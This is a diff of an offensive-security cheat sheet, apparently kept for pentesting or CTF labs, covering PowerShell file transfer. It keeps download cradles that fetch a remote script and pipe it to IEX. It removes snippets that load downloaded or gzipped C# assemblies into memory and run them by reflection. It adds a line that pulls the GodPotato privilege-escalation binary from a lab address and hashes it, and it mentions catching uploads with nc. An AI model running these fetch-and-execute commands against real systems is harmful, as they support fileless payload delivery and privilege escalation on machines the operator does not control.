@@ -44,21 +44,10 @@ Invoke-WebRequest -UseBasicParsing -URI http://<server>/<script> | IEX
 Invoke-WebRequest -UseBasicParsing -URI http://<server>/<script> -Proxy http://<proxy_server>:<proxy_port> -ProxyCredential (New-Object System.Management.Automation.PSCredential("<proxy_login>", (ConvertTo-SecureString '<proxy_password>' -Asplaintext -force))) | IEX
 ```
 
-## file transfert - download csharp into memory (Assembly reflection)
+## file transfer - shar256
 ```powershell
-$d = (New-Object System.Net.WebClient).DownloadData('http://<server>/<binary>'); $asm = [System.Reflection.Assembly]::Load($d); 
+$d = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.6/win/bin/GodPotato-NET4.exe'); $h = [System.Security.Cryptography.SHA256]::Create().ComputeHash($d); -join ($h | % { $_.ToString("x2") })
 ```
-
-## file transfert - download gziped csharp into memory (Assembly reflection)
-```powershell
-$b64 = (New-Object System.Net.WebClient).DownloadData('http://<server>/<binary>');$c=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($b64));$d = New-Object IO.Compression.GzipStream($c,[IO.Compression.CoMPressionMode]::DEComPress);$asm = [System.Reflection.Assembly]::Load($d); 
-```
-
-## file transfert - run csharp from memory (Assembly reflection) 
-```powershell
-$params="<asm_ref_params>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
-```
-= asm_ref_params: -group=user -full
 
 ## file transfert - upload base64 (in-memory)
 catch with nc then echo <base64> | base64 -d -w 0 > hosts
